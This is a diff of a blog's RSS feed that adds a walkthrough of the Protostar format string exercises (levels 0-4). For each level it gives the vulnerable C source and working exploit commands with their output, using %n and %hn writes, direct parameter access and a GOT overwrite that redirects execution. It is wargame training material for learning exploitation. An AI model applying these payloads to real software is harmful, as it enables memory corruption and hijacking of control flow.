@@ -6,8 +6,465 @@
     <description>Recent content on Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 19 Jun 2016 13:37:33 -0400</lastBuildDate>
+    <lastBuildDate>Sun, 26 Jun 2016 03:10:18 -0400</lastBuildDate>
     <atom:link href="http://mislusnys.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Protostar Format String (Levels 0-4)</title>
+      <link>http://mislusnys.github.io/blog/2016/06/26/protostar-format-string-levels-0-4/</link>
+      <pubDate>Sun, 26 Jun 2016 03:10:18 -0400</pubDate>
+      
+      <guid>http://mislusnys.github.io/blog/2016/06/26/protostar-format-string-levels-0-4/</guid>
+      <description>
+
+&lt;p&gt;Protostar is a Linux VM with a series of exploitation exercises. It has five sections: stack overflows, format strings, heap overflows,
+network code and 3 final levels with combinations of all the above.&lt;/p&gt;
+
+&lt;p&gt;This post contains solutions for the five format string levels.&lt;/p&gt;
+
+&lt;h3 id=&#34;format0:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Format0&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.&lt;/p&gt;
+
+&lt;p&gt;Hints&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;This level should be done in less than 10 bytes of input.&lt;/li&gt;
+&lt;li&gt;“Exploiting format string vulnerabilities”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This level is at /opt/protostar/bin/format0&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;source-code:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Source Code&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+void vuln(char *string)
+{
+  volatile int target;
+  char buffer[64];
+
+  target = 0;
+
+  sprintf(buffer, string);
+  
+  if(target == 0xdeadbeef) {
+      printf(&amp;quot;you have hit the target correctly :)\n&amp;quot;);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln(argv[1]);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The &lt;code&gt;sprintf&lt;/code&gt; function in the code above has both buffer overflow and format string vulnerabilities.
+A standard buffer overflow would look like this (overwriting the target in the process):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format0 `python -c &amp;quot;print &#39;A&#39;*64 + &#39;\xef\xbe\xad\xde&#39;&amp;quot;`
+you have hit the target correctly :)
+user@protostar:/opt/protostar/bin$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;However, this method uses 68 bytes of input. The 64 &amp;ldquo;A&amp;rdquo;&amp;rsquo;s can be replaced with a format string which has a specific width field &lt;code&gt;%64x&lt;/code&gt;.
+Now the exploit looks like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format0 `python -c &amp;quot;print &#39;%64x\xef\xbe\xad\xde&#39;&amp;quot;`
+you have hit the target correctly :)
+user@protostar:/opt/protostar/bin$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This method uses 8 bytes of input.&lt;/p&gt;
+
+&lt;h3 id=&#34;format1:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Format1&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;This level shows how format strings can be used to modify arbitrary memory locations.&lt;/p&gt;
+
+&lt;p&gt;Hints&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;objdump -t is your friend, and your input string lies far up the stack :)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This level is at /opt/protostar/bin/format1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;source-code-1:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Source Code&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int target;
+
+void vuln(char *string)
+{
+  printf(string);
+  
+  if(target) {
+      printf(&amp;quot;you have modified the target :)\n&amp;quot;);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln(argv[1]);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In this level we have to overwrite a global variable &lt;code&gt;target&lt;/code&gt; with any value. First we need to find the address of our input on the stack.
+We can use a piece of string that is easy to look for (like &amp;ldquo;AAAAAAAA&amp;rdquo;) and dump a piece of the stack with &lt;code&gt;%x&lt;/code&gt; format strings:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `python -c &amp;quot;print &#39;AAAAAAAA&#39; + &#39;%x.&#39;*200&amp;quot;`
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once we are able to identify our input (41414141) in this hex dump, we can try to adjust the payload to hit a precise possition:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `python -c &amp;quot;print &#39;AAAAAAAA&#39; + &#39;%x.&#39;*128&amp;quot;`
+AAAAAAAA804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff831.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.105f6e4e.3a0bf85e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff827.bffff831.0.bffff9ba.bffff9c8.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.78bf3ff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.43000000.c717d6c1.3b98f7d9.5d2de33f.697bf342.363836.0.2e000000.726f662f.3174616d.41414100
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As we can see our input does not align properly, so we have to pad it a little bit.
+We can adjust the payload and stick a single &lt;code&gt;%x&lt;/code&gt; to the end to see if we got it right:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `python -c &amp;quot;print &#39;AAAAAAAA00&#39; + &#39;%x.&#39;*127&amp;quot;`%x
+AAAAAAAA00804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff830.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.947fee7e.be2b786e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff826.bffff830.0.bffff9ba.bffff9c8.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.78bf3ff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.6b000000.87c2a0a8.f580b5c9.a30e6569.69f7f8e0.363836.0.2f2e0000.6d726f66.317461.41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that we have the correct position we need to replace the &amp;ldquo;A&amp;rdquo;&amp;rsquo;s with the address of our &lt;code&gt;target&lt;/code&gt; variable.
+We can find it with the objdump command:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
+08049638 g     O .bss	00000004              target
+user@protostar:/opt/protostar/bin$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After we insert our address (little endian) we can also replace the last &lt;code&gt;%x&lt;/code&gt; with the &lt;code&gt;%n&lt;/code&gt;. This modifier writes to the specified address instead of displaying the contents. Now we can pass this level:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `python -c &amp;quot;print &#39;\x38\x96\x04\x08AAAA00&#39; + &#39;%x.&#39;*127&amp;quot;`%n
+8�AAAA00804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff830.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.aaa339a8.80f7afb8.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff826.bffff830.0.bffff9ba.bffff9c8.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.78bf3ff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.b8000000.ecbb7eda.506baaa7.48d611bb.69d839a6.363836.0.2f2e0000.6d726f66.317461.you have modified the target :)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;format2:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Format2&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;This level moves on from format1 and shows how specific values can be written in memory.&lt;/p&gt;
+
+&lt;p&gt;This level is at /opt/protostar/bin/format2&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;source-code-2:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Source Code&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int target;
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+  printf(buffer);
+  
+  if(target == 64) {
+      printf(&amp;quot;you have modified the target :)\n&amp;quot;);
+  } else {
+      printf(&amp;quot;target is %d :(\n&amp;quot;, target);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This level builds on the previous level by requiring to overwrite the &lt;code&gt;target&lt;/code&gt; with a specific value (decimal 64).
+Similarly to the previous level we need to find our input on the stack. This time, however, the input is being read from stdin instead of being passed as an argument.
+Also the payload is a lot closer to the top of the stack:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;AAAAAAAA&#39; + &#39;%x.&#39;*5&amp;quot;` | ./format2
+AAAAAAAA200.b7fd8420.bffff624.41414141.41414141.
+target is 0 :(
+user@protostar:/opt/protostar/bin$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Similarly, we find the address of the &lt;code&gt;target&lt;/code&gt; variable and test if we can precisely display and overwrite the address:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
+080496e4 g     O .bss	00000004              target
+user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;AAAA\xe4\x96\x04\x08&#39; + &#39;%x.&#39;*4&amp;quot;`%x | ./format2
+AAAA��200.b7fd8420.bffff624.41414141.80496e4
+target is 0 :(
+user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;AAAA\xe4\x96\x04\x08&#39; + &#39;%x.&#39;*4&amp;quot;`%n | ./format2
+AAAA��200.b7fd8420.bffff624.41414141.
+target is 39 :(
+user@protostar:/opt/protostar/bin$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we can adjust the payload a little bit to overwrite the target with exact value of 64. First we change the &amp;ldquo;&amp;lsquo;%x.&amp;rsquo;*4&amp;rdquo; to &amp;ldquo;%x%x%x%x&amp;rdquo; and then we can adjust
+the width of one of the &lt;code&gt;%x&lt;/code&gt; modifiers to hit the precise byte value:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;AAAA\xe4\x96\x04\x08&#39; + &#39;%x%x%x%x&#39;&amp;quot;`%n | ./format2
+AAAA��200b7fd8420bffff62441414141
+target is 35 :(
+user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;AAAA\xe4\x96\x04\x08&#39; + &#39;%32x%x%x%x&#39;&amp;quot;`%n | ./format2
+AAAA��                             200b7fd8420bffff62441414141
+you have modified the target :)
+user@protostar:/opt/protostar/bin$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;format3:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Format3&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.&lt;/p&gt;
+
+&lt;p&gt;This level is at /opt/protostar/bin/format3&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;source-code-3:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Source Code&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int target;
+
+void printbuffer(char *string)
+{
+  printf(string);
+}
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+
+  printbuffer(buffer);
+  
+  if(target == 0x01025544) {
+      printf(&amp;quot;you have modified the target :)\n&amp;quot;);
+  } else {
+      printf(&amp;quot;target is %08x :(\n&amp;quot;, target);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This level advances from format2 and requires us to write a specific 4 byte value into the &lt;code&gt;target&lt;/code&gt; memory address.
+First we find the exact address of the &lt;code&gt;target&lt;/code&gt; variable:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target
+080496f4 g     O .bss	00000004              target
+user@protostar:/opt/protostar/bin$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can write the full 4 byte value &lt;code&gt;0x01025544&lt;/code&gt; using four writes. If we shift the address each time by one byte we should be able to effectively write
+1 byte into target address with each write. The whole process of overwriting the target address should roughly look like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Memory Address	
+0x080496f4        44 00 00 00
+0x080496f5           55 00 00 00 
+0x080496f6              02 00 00 00
+0x080496f7                 01 00 00 00
+		  44 55 02 01	
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To further simplify the process of multiple writes we can use a technique called &amp;ldquo;Direct Parameter Access&amp;rdquo; (DPA). It allows to directly address a stack
+parameter from within the format string. The DPA is controlled by the &amp;ldquo;$&amp;rdquo; qualifier. For example:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;printf (&amp;quot;%6$d\n&amp;quot;, 6, 5, 4, 3, 2, 1);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This prints &amp;ldquo;1&amp;rdquo;, because &amp;ldquo;6$&amp;rdquo; explicitly addresses the 6th parameter on the stack.&lt;/p&gt;
+
+&lt;p&gt;In our case, the input lies as the 12th parameter on the stack:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAA%12\$x | ./format3
+AAAA41414141
+target is 00000000 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we can start overwriting the target memory by writing into four consecutive addresses and addressing them as &lt;code&gt;$12&lt;/code&gt;, &lt;code&gt;$13&lt;/code&gt;, &lt;code&gt;$14&lt;/code&gt; and &lt;code&gt;$15&lt;/code&gt; using the DPA:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08&#39;&amp;quot;`%12\$n%13\$n%14$\n%15\$n | ./format3
+��������
+target is 10101010 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We have overwritten the target with &lt;code&gt;0x10&lt;/code&gt;&amp;rsquo;s (16 - four 4-byte addresses). We can now adjust the values written by using the &lt;code&gt;%x&lt;/code&gt; width modifiers.
+We can use gdb to calculate the exact values:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb -q
+(gdb) p 0x44 - 0x10
+$1 = 52
+(gdb) p 0x55 - 0x44
+$2 = 17
+(gdb) p 0x102 - 0x55
+$3 = 173
+(gdb) p 0x101 - 0x02
+$4 = 255
+(gdb) quit
+user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08&#39;&amp;quot;`%52x%12\$n%17x%13\$n%173x%14$\n%255x%15\$n | ./format3
+��������                                                   0         bffff5e0                                                                                                                                                                     b7fd7ff4                                                                                                                                                                                                                                                              0
+you have modified the target :)
+user@protostar:/opt/protostar/bin$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;using-short-writes:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Using Short Writes&lt;/h5&gt;
+
+&lt;p&gt;We can achieve the same effect of writing a full 4-byte value by doing just two write operations. We can use a special write operation which writes
+short int types - the &lt;code&gt;%hn&lt;/code&gt; parameter. Not only it shortens the exploit string itself, it also prevents a side effect of overwriting additional memory.
+We can refer to the previous chapter and see that with four write method we overwrote additional 3 bytes after the target address with &lt;code&gt;0x00&lt;/code&gt;. This can
+have side effects if that memory stores important information (such as a pointer to some function).&lt;/p&gt;
+
+&lt;p&gt;So using the short write method our exploit looks like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb -q
+(gdb) p 0x5544 - 8
+$1 = 21820
+(gdb) p 0x10102 - 0x5544
+$2 = 43966
+(gdb) quit
+user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;\xf4\x96\x04\x08\xf6\x96\x04\x08&#39;&amp;quot;`%21820x%12\$hn%43966x%13\$hn | ./format3
+...( HUGE amount of space)...
+
+                                   bffff5e0
+you have modified the target :)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;format4:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Format4&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;%p format4 looks at one method of redirecting execution in a process.&lt;/p&gt;
+
+&lt;p&gt;Hints&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;objdump -TR is your friend&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This level is at /opt/protostar/bin/format4&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;source-code-4:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Source Code&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int target;
+
+void hello()
+{
+  printf(&amp;quot;code execution redirected! you win\n&amp;quot;);
+  _exit(1);
+}
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+
+  printf(buffer);
+
+  exit(1);   
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In this level we need to alter code execution flow and execute the &lt;code&gt;hello()&lt;/code&gt; function.
+The easiest method would be to overwrite the &lt;code&gt;exit()&lt;/code&gt; functions address in the global offset table (GOT) with the address of the &lt;code&gt;hello()&lt;/code&gt;.
+This way when the program tries to exit (after printf) it will execute our code instead.&lt;/p&gt;
+
+&lt;p&gt;First we examine the GOT and find the entry for the &lt;code&gt;exit()&lt;/code&gt; at &lt;code&gt;0x08049724&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -TR format4
+
+format4:     file format elf32-i386
+
+DYNAMIC SYMBOL TABLE:
+00000000  w   D  *UND*	00000000              __gmon_start__
+00000000      DF *UND*	00000000  GLIBC_2.0   fgets
+00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
+00000000      DF *UND*	00000000  GLIBC_2.0   _exit
+00000000      DF *UND*	00000000  GLIBC_2.0   printf
+00000000      DF *UND*	00000000  GLIBC_2.0   puts
+00000000      DF *UND*	00000000  GLIBC_2.0   exit
+080485ec g    DO .rodata	00000004  Base        _IO_stdin_used
+08049730 g    DO .bss	00000004  GLIBC_2.0   stdin
+
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+080496fc R_386_GLOB_DAT    __gmon_start__
+08049730 R_386_COPY        stdin
+0804970c R_386_JUMP_SLOT   __gmon_start__
+08049710 R_386_JUMP_SLOT   fgets
+08049714 R_386_JUMP_SLOT   __libc_start_main
+08049718 R_386_JUMP_SLOT   _exit
+0804971c R_386_JUMP_SLOT   printf
+08049720 R_386_JUMP_SLOT   puts
+08049724 R_386_JUMP_SLOT   exit
+
+user@protostar:/opt/protostar/bin$ objdump -t format4 | grep hello
+080484b4 g     F .text	0000001e              hello
+user@protostar:/opt/protostar/bin$ 
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The address of the &lt;code&gt;hello&lt;/code&gt; function is &lt;code&gt;0x080484b4&lt;/code&gt;. So now we need to write this address into the GOT entry for the &lt;code&gt;exit&lt;/code&gt; function (at &lt;code&gt;0x08049724&lt;/code&gt;).
+Our input string is the $4 parameter (DPA):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAA`python -c &amp;quot;print &#39;%x.&#39;*20&amp;quot;` | ./format4
+AAAA200.b7fd8420.bffff624.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.a.
+user@protostar:/opt/protostar/bin$ echo AAAA%4\$x | ./format4
+AAAA41414141
+user@protostar:/opt/protostar/bin$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now using the short write method we write a couple of test values first (this makes the program segfault) and later correct them with the help of gdb:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;\x24\x97\x04\x08\x26\x97\x04\x08&#39;&amp;quot;`%4\$hn%5\$hn | ./format4
+$�&amp;amp;�
+Segmentation fault
+user@protostar:/opt/protostar/bin$ gdb -q
+(gdb) p 0x84b4 - 8
+$1 = 33964
+(gdb) p 0x10804 - 0x84b4
+$2 = 33616
+(gdb) quit
+user@protostar:/opt/protostar/bin$ echo `python -c &amp;quot;print &#39;\x24\x97\x04\x08\x26\x97\x04\x08&#39;&amp;quot;`%33964x%4\$hn%33616x%5\$hn | ./format4
+...( HUGE amount of space)...
+                      b7fd8420
+code execution redirected! you win
+user@protostar:/opt/protostar/bin$ 
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
     
     <item>
       <title>Protostar Exploit Exercises - Stack Levels</title>
